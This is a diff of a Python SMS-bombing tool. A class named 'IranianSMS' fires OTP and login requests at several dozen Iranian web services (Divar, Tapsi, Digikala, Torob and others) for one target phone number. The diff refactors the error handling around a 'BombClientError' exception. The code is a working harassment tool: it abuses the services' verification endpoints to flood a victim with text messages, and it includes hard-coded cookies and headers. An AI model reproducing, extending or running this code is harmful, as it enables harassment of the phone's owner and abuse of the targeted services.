@@ -4,11 +4,10 @@
 # ____________________________________________
 
 # ======== # Import part # ======== #  
-from lib import Headers
-from time import sleep
+from typing import Literal
+from lib import Headers, bomb_exceptions
 try:
-    from requests import post, get, Response
-    from colorama import Fore
+    from requests import post, get, Response, exceptions
 except ImportError:
     exit('Some required module are missing.\nPlease run "path pip install -r requirements.txt" command on your terminal.')
 
@@ -17,19 +16,22 @@ class IranianSMS:
     def __init__(self, PhoneNumber: str) -> None:
         self.PhoneNumber: str = PhoneNumber
         
-    def divar(self) -> bool:
+    def divar(self)  -> Literal[True]:
         divar_URL: str = r"https://api.divar.ir/v5/auth/authenticate"
         
         try:
             result: Response = post(divar_URL, headers=Headers.divar_header, json={"phone":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def tapsi_passenger(self) -> bool:
+    def tapsi_passenger(self) -> Literal[True]:
         tapsi_passenger_login_URL: str = r"https://accounts-api.tapsi.ir/api/v1/sso-user/auth"
         cookies = {'__arcsco': '6bb021ad4353286b466629402d8c68a0',}
         json_data = {
@@ -38,122 +40,152 @@ class IranianSMS:
         'phone_number': self.PhoneNumber,}
         try:
             result: Response = post(tapsi_passenger_login_URL, headers=Headers.tapsi_passenger_login, cookies=cookies, json=json_data )
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def tapsi_biker(self) -> bool:
+    def tapsi_biker(self) -> Literal[True]:
         tapsi_biker_URL: str = r"https://tap33.me/api/v2/user"
         
         try:
             result: Response = post(tapsi_biker_URL, headers=Headers.tapsi_biker_header, json={"credential":{"phoneNumber": self.PhoneNumber, "role":"BIKER"}})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def tapsi_driver(self) -> bool:
+    def tapsi_driver(self) -> Literal[True]:
         tapsi_driver_URL = r"https://api.tapsi.ir/api/v2.2/user"
 
         try:
             result: Response = post(tapsi_driver_URL, headers=Headers.tapsi_driver_header, json={"credential":{"phoneNumber":self.PhoneNumber, "role":"DRIVER"},"otpOption":"SMS"})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def trob(self) -> bool:
+    def trob(self) -> Literal[True]:
         trob_URL: str = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.PhoneNumber}"
         
         try:
             result: Response = get(trob_URL, headers=Headers.trob_header)
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def sheypoor (self) -> bool:
+    def sheypoor (self) -> Literal[True]:
         sheypoor_URL: str = r"https://www.sheypoor.com/api/v10.0.0/auth/send"
         
         try:
             result: Response = post(sheypoor_URL, headers=Headers.sheypoor_header, json={"username":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def sheypoor_app_link(self) -> bool:
+    def sheypoor_app_link(self) -> Literal[True]:
         sheypoor_app_link_URL: str = r"https://www.sheypoor.com/api/web/download/send-notification"
 
         try:
             result: Response = post(sheypoor_app_link_URL, headers=Headers.sheypoor_app_link, data={"mobile":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def okcs(self) -> bool:
+    def okcs(self) -> Literal[True]:
         okcs_URL: str = r"https://okcs.com/users/mobilelogin"
         
         try:
             result: Response = post(okcs_URL, headers=Headers.okcs_header, data={"mobile":self.PhoneNumber, "url":"https%3A%2F%2Fokcs.com"})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def alibaba(self) -> bool:
+    def alibaba(self) -> Literal[True]:
         alibaba_URL: str = r"https://ws.alibaba.ir/api/v3/account/mobile/otp"
         
         try:
             result: Response = post(alibaba_URL, headers=Headers.alibaba_header, json={"phoneNumber":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def oketab(self) -> bool:
+    def oketab(self) -> Literal[True]:
         oketab_URL: str = f"https://www.oketab.com/index.php?login&rotp=true&mb={self.PhoneNumber}"
         
         try:
             result: Response = post(oketab_URL, headers=Headers.oketab)
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def GapFilm(self) -> bool:
+    def GapFilm(self) -> Literal[True]:
         GapFilm_URL: str = r"https://core.gapfilm.ir/api/v3.1/Account/Login"
 
         try:
             result: Response = post(GapFilm_URL, headers=Headers.GapFilm_header, json={"Type":3,"Username":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def FilmNet(self) -> bool:
+    def FilmNet(self) -> Literal[True]:
         FilmNet_URL: str = f"https://tv.filmnet.ir/api-v2/access-token/users/{self.PhoneNumber}/otp"
         try:
             result: Response = get(FilmNet_URL, headers=Headers.filmnet_header)
@@ -164,55 +196,67 @@ class IranianSMS:
         else:
             return True
         
-    def DrDr(self) -> bool:
+    def DrDr(self) -> Literal[True]:
         DrDr_URL: str = r"https://drdr.ir/api/v3/auth/login/mobile/init"
         
         try:
             result: Response = post(DrDr_URL, headers=Headers.DrDr_header, json={"mobile":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def itoll_app_link(self) -> bool:
+    def itoll_app_link(self) -> Literal[True]:
         itoll_app_link_URL: str = r"https://app.itoll.com/api/v1/send-application-link"
         
         try:
             result: Response = post(itoll_app_link_URL, headers=Headers.itoll_app_link_header, json={"mobile":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def anar360(self) -> bool:
+    def anar360(self) -> Literal[True]:
         anar360_URL: str = r"https://anar360.com/api/_/auth/check"
         
         try:
             result: Response = post(anar360_URL, headers=Headers.anar360_header, json={"mobile":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def azki(self) -> bool:
+    def azki(self) -> Literal[True]:
         azki_URL: str = r"https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/"
         
         try:
             result: Response = post(azki_URL, headers=Headers.azki_header, json={"phoneNumber":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def Nashr_olgoo(self) -> bool:
+    def Nashr_olgoo(self) -> Literal[True]:
         Nashr_olgoo_URL: str = f"https://www.olgoobooks.ir/signupStudents/"
 
         data = {
@@ -228,111 +272,138 @@ class IranianSMS:
         
         try:
             result: Response = post(Nashr_olgoo_URL, headers=Headers.Nashr_olgoo_header, cookies=cookies, data=data)
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def banimode(self) -> bool:
+    def banimode(self) -> Literal[True]:
         banimode_URL: str = r"https://mobapi.banimode.com/api/v2/auth/request"
         
         try:
             result: Response = post(banimode_URL, headers=Headers.banimode_header, json={"phone":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def lendo(self) -> bool:
+    def lendo(self) -> Literal[True]:
         lendo_URL: str = r"https://api.lendoco.ir/api/customer/auth/send-otp"
         
         try:
             result: Response = post(lendo_URL, headers=Headers.lendo_header, json={"mobile":self.PhoneNumber})
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
 
-    def basalam(self) -> bool:
+    def basalam(self) -> Literal[True]:
         basalam_URL: str = r"https://auth.basalam.com/otp-request"
         
         try:
             result: Response = post(basalam_URL, headers=Headers.basalam_header, json={"mobile": self.PhoneNumber,"client_id":11} ) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def drsaina(self) -> bool:
+    def drsaina(self) -> Literal[True]:
         basalam_URL: str = f"https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber={self.PhoneNumber}"
         
         try:
             result: Response = get(basalam_URL, headers=Headers.drsaina_header) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def see5(self) -> bool:
+    def see5(self) -> Literal[True]:
         see5_URL: str = r"https://crm.see5.net/api_ajax/sendotp.php"
         
         try:
             result: Response = post(see5_URL, headers=Headers.see5_header, data=f"mobile={self.PhoneNumber}&action=sendsms&mcaptcha=764515" ) 
 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
 
-    def bimito(self) -> bool:
+    def bimito(self) -> Literal[True]:
         bimito_URL: str = r"https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/"
         
         try:
             result: Response = post(bimito_URL, headers=Headers.bimito_header, json={"phoneNumber":self.PhoneNumber}) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def sibirani(self) -> bool:
+    def sibirani(self) -> Literal[True]:
         sibirani_URL: str = r"https://sandbox.sibirani.com/api/v1/user/invite"
         
         try:
             result: Response = post(sibirani_URL, headers=Headers.sibirani_header, json={"username":self.PhoneNumber}) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
-    def hamrah_mechanic(self) -> bool:
+    def hamrah_mechanic(self) -> Literal[True]:
         hamrah_mechanic_URL: str = r"https://www.hamrah-mechanic.com/api/v1/membership/otp"
         
         try:
             result: Response = post(hamrah_mechanic_URL, headers=Headers.hamrah_mechanic_header, json={"PhoneNumber":self.PhoneNumber,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/contactus/","referrer":"https://www.google.com/"}) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True 
 
-    def varzesh3(self) -> bool:
+    def varzesh3(self) -> Literal[True]:
         varzesh3_URL: str = r"https://sso.varzesh3.com/account/login"
         
         params = {
@@ -350,14 +421,17 @@ class IranianSMS:
 }   
         try:
             result: Response = post(varzesh3_URL, headers=Headers.varzesh3_header, data=data, cookies=cookies, params=params) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True 
         
-    def digikala(self) -> bool:
+    def digikala(self) -> Literal[True]:
         digikala_URL: str = r"https://api.digikala.com/v1/user/authenticate/"
         cookies = {
     '_sp_id.13cb': 'ea35d45f-b735-43cb-86fb-a3e9725a68af.1720376938.1.1720377053..be86ef53-bc7b-48f7-a4d5-f7bc412ec0ac..a985481f-0e48-4c12-bebc-3a893a830130.1720376937683.15',
@@ -373,15 +447,18 @@ class IranianSMS:
 }   
         try:
             result: Response = post(digikala_URL, headers=Headers.digikala_headers, json=json_data, cookies=cookies) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
     
     
-    def telewebion(self) -> bool:
+    def telewebion(self) -> Literal[True]:
         telewebion_URL: str = r"https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
         
         json_data = {
@@ -391,33 +468,42 @@ class IranianSMS:
 }   
         try:
             result: Response = post(telewebion_URL, headers=Headers.telewebion_headers, json=json_data) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
         
-    def pindo(self) -> bool:
+    def pindo(self) -> Literal[True]:
         pindo_URL: str = r"https://api.pindo.ir/v1/user/login-register/"
         
         try:
             result: Response = post(pindo_URL, headers=Headers.pindo_header, json={'phone': self.PhoneNumber}) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True  
     
-    def threetex(self) -> bool:
+    def threetex(self) -> Literal[True]:
         threetex_url: str = r"https://3tex.io/api/1/users/validation/mobile"
 
         try:
             result: Response = post(threetex_url, headers=Headers.threetex_header, json={'receptorPhone': self.PhoneNumber}) 
-            if(result.status_code > 300):
-                raise ConnectionError
-        except:
-            return False
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
         else:
             return True
